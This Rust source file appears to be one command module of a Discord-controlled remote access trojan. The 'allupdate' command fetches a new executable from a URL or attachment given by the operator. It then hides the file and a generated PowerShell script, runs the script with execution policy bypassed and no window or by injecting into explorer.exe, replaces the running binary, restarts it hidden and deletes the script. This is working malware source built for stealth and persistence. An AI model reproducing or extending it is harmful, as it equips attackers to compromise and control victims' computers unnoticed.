use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::{Context, Result};
use async_trait::async_trait;
use std::env;
use std::fs;
use std::os::windows::process::CommandExt;
use std::path::Path;
use std::process;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct AllUpdateCommand;

#[async_trait]
impl BotCommand for AllUpdateCommand {
    fn name(&self) -> &str { "allupdate" }
    fn description(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::Desc, "ALLUPDATE").into_boxed_str())
    }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".allupdate <url> | .allupdate (with attachment)" }
    fn examples(&self) -> &'static [&'static str] { 
        Box::leak(vec![
            Box::leak(format!(".allupdate {}", StegoStore::get(StringCategory::Url, "EXAMPLE_RAT")).into_boxed_str()) as &'static str,
            ".allupdate (with attachment)"
        ].into_boxed_slice())
    }
    fn aliases(&self) -> &'static [&'static str] { &[] }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, mut args: Arguments) -> Result<()> {
        let url = if !msg.attachments.is_empty() {
            msg.attachments[0].url.clone()
        } else if let Some(url) = args.next() {
            url.to_string()
        } else {
            // No attachment or URL provided - just exit silently for allupdate
            // (since this is a broadcast command, we don't want error spam)
            return Ok(());
        };

        self.hndl_upd(http, msg, &url).await
    }
}

impl AllUpdateCommand {
    async fn hndl_upd(&self, http: &Arc<HttpClient>, msg: &Message, url: &str) -> Result<()> {
        // Download the update
        let resp = reqwest::get(url).await.context("Failed to download file")?;
        if !resp.status().is_success() {
            // Silently fail for allupdate to avoid spam
            return Ok(());
        }
        let bytes = resp.bytes().await.context("Can't read file bytes")?;
        self.do_upd(bytes.to_vec())?;

        // Exit to trigger update
        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
        process::exit(0);
    }

    fn do_upd(&self, new_exe_bytes: Vec<u8>) -> Result<()> {
        let curr_exe_path = env::current_exe().context("Couldn't find current exe path")?;
        let install_dir = curr_exe_path.parent().context("Can't get parent dir")?;
        
        // Ensure install dir exists (it should, but for safety)
        fs::create_dir_all(&install_dir).ok();

        let new_exe_path = install_dir.join("snaky_upd.exe");
        fs::write(&new_exe_path, new_exe_bytes).context("Can't write new exe")?;
        
        // Hide the new temporary exe
        if let Some(engine) = crate::stealth::get_engine() {
            let cmd = StegoStore::get(StringCategory::Win, "KCT_ATTRIB_HIDDEN").replace("{}", &new_exe_path.to_string_lossy());
            let _ = engine.execute_stealth_cmd_with_output(&cmd);
        } else {
            let _ = process::Command::new("attrib")
                .args(["+s", "+h", &new_exe_path.to_string_lossy()])
                .creation_flags(0x08000000)
                .output();
        }

        let script_content = self.gen_ps_script(&curr_exe_path, &new_exe_path)?;
        let script_path = install_dir.join("s_update.ps1");
        fs::write(&script_path, script_content).context("Can't create update script")?;
        
        // Hide script
        if let Some(engine) = crate::stealth::get_engine() {
            let cmd = StegoStore::get(StringCategory::Win, "KCT_ATTRIB_HIDDEN").replace("{}", &script_path.to_string_lossy());
            let _ = engine.execute_stealth_cmd_with_output(&cmd);
            
            let cmd_run = StegoStore::get(StringCategory::Win, "KCT_PS_EXEC_FILE").replace("{}", &script_path.to_string_lossy());
            unsafe {
                let mut pid = 0;
                let mut sys = sysinfo::System::new_all();
                sys.refresh_processes();
                use sysinfo::{SystemExt, ProcessExt, PidExt};
                for (p, process) in sys.processes() {
                    if process.name().to_lowercase() == "explorer.exe" {
                        pid = p.as_u32(); break;
                    }
                }
                if pid != 0 {
                    let _ = engine.kct_auto_inject(pid, &cmd_run);
                } else {
                    let _ = engine.execute_stealth_cmd_with_output(&cmd_run);
                }
            }
        } else {
            let _ = process::Command::new("attrib")
                .args(["+s", "+h", &script_path.to_string_lossy()])
                .creation_flags(0x08000000)
                .output();

            process::Command::new("powershell.exe")
                .args([
                    "-ExecutionPolicy", "Bypass",
                    "-NoProfile",
                    "-WindowStyle", "Hidden",
                    "-File", &script_path.to_string_lossy(),
                ])
                .creation_flags(0x08000000) // CREATE_NO_WINDOW
                .spawn()
                .context("Can't run the update script")?;
        }

        Ok(())
    }

    fn gen_ps_script(&self, old_exe: &Path, new_exe: &Path) -> Result<String> {
        let old_exe_path_str = old_exe.to_string_lossy().replace("'", "''");
        let new_exe_path_str = new_exe.to_string_lossy().replace("'", "''");

        let script = format!(
            r#"
$ErrorActionPreference = 'SilentlyContinue'
$old_exe = '{old_path}'
$new_exe = '{new_path}'

# Try to stop current process by path
Get-Process | Where-Object {{ $_.Path -eq $old_exe }} | Stop-Process -Force
Start-Sleep -Seconds 2

# Force remove old exe
if (Test-Path $old_exe) {{
    Remove-Item -Path $old_exe -Force
}}

# Move new exe to old exe location (rename/replace)
Move-Item -Path $new_exe -Destination $old_exe -Force

# Apply attributes
attrib +s +h $old_exe

# Restart
Start-Process -FilePath $old_exe -ArgumentList '--hide-decoy' -WindowStyle Hidden

Start-Sleep -Seconds 2
Remove-Item $MyInvocation.MyCommand.Path -Force
"#,
            old_path = old_exe_path_str,
            new_path = new_exe_path_str,
        );

        Ok(script)
    }
}
